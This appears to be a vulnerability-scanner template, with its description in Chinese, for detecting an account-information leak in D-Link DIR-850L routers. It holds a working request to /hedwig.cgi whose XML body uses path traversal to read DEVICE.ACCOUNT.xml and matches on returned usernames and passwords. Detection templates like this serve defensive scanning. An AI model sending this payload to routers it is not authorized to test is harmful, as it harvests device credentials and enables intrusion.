id: dlink-850L-info-leak

info:
  name: D-Link DIR-850L 账户信息泄露
  author: pikpikcu
  severity: high
  description: |
    该模板用于检测 D-Link DIR-850L 账户信息泄露。该类问题通常源于调试页面、配置文件、接口响应或目录资源被非预期暴露。模板会向 `/hedwig.cgi` 等位置发送探测请求，并结合响应状态、关键字、错误信息、时间差或外带交互等证据判断目标是否受影响。
  impact: |
    - 攻击者可获取系统版本、路径、账号、密钥、配置或业务数据等敏感信息。
    - 泄露的信息可能被用于后续漏洞匹配、凭据攻击、权限提升或横向移动。
  remediation: |
    - 关闭不必要的调试、示例、备份和信息展示接口，避免向未授权用户返回敏感内容。
    - 对敏感文件和接口增加访问控制，并从 Web 根目录移除备份、日志和配置文件。
    - 排查已泄露的凭据、令牌和配置，必要时执行轮换并检查访问日志。
  reference:
    - https://xz.aliyun.com/t/2941
  metadata:
    max-request: 1
  tags: dlink,vuln

http:
  - method: POST
    path:
      - "{{BaseURL}}/hedwig.cgi"

    body: |
      <?xml version="1.0" encoding="utf-8"?><postxml><module><service>../../../htdocs/webinc/getcfg/DEVICE.ACCOUNT.xml</service></module></postxml>

    headers:
      Cookie: uid=R8tBjwtFc8
      Content-Type: text/xml

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - "</usrid>"
          - "</password>"
        part: body
